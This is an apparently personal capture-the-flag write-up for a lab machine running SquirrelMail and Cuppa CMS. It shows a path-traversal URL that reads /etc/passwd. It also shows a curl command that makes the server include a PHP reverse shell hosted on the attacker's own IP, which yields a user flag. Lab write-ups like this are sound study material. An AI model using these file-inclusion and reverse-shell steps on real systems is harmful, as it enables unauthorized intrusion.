
### /squirrelmail
SquirrelMail version 1.4.23 CVE 2017-7692 

https://legalhackers.com/videos/SquirrelMail-Exploit-Remote-Code-Exec-CVE-2017-7692-Vuln.html

https://legalhackers.com/advisories/SquirrelMail-Exploit-Remote-Code-Exec-CVE-2017-7692-Vuln.html

but we cant get a rev shell 

![[Pasted image 20210528155936.png]]

so fuzzing the hidden directory

### /45kra24zxs28v3yd/administrator/

from the http://10.10.82.251/45kra24zxs28v3yd/administrator/

cuppa cms 
https://www.exploit-db.com/exploits/25971

we can use this 
http://10.10.82.251/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

![[Pasted image 20210528160806.png]]

exploit 

modify a php reverse shell and host it

```
curl http://10.10.82.251/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.17.4.208/rev-shell-lin.php?

```
and listen on listener

![[Pasted image 20210528161309.png]]

![[Pasted image 20210528161414.png]]

user === 7ce5c2109a40f958099283600a9ae807